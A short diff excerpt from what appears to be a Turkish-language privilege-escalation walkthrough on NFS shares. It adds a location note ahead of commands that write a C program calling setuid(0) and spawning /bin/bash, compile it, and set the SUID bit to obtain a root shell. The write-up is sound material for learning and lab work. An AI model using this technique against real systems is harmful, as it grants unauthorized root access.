@@ -63,6 +63,7 @@ SUID bitlerini ayarlayabildiğimiz için hedef sistemde /bin/bash'i çalıştır
 ![image](https://github.com/user-attachments/assets/dde4845c-94af-41e1-a82c-d190484f33e3)
 
 ```bash
+/tmp/backupsonattackermachine içinde
 # echo "int main(){setgid(0);setuid(0);system('/bin/bash');return 0;}" >> nfs.c
 # gcc nfs.c -o nfs -w 
 # chmod +s nfs   
